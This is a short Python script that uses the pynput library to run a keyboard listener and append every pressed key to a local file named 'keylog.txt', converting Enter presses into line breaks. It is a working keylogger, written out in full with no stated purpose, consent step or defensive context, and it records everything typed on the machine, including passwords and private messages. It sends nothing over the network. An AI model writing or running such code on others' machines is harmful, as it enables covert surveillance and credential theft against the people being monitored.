from pynput.keyboard import Listener

# Function to write the pressed key to the log file
def write_to_log(key):
    key = str(key)
    # Remove the single quotes around the key if it's an alphabet or a number
    if key.startswith('\'') and key.endswith('\''):
        key = key[1:-1]
    # Add a newline character at the end of each key pressed
    if key == 'Key.enter':
        key = '\n'
    with open("keylog.txt", "a") as f:
        f.write(key)

# Start the listener to monitor keystrokes
with Listener(on_press=write_to_log) as listener:
    listener.join()

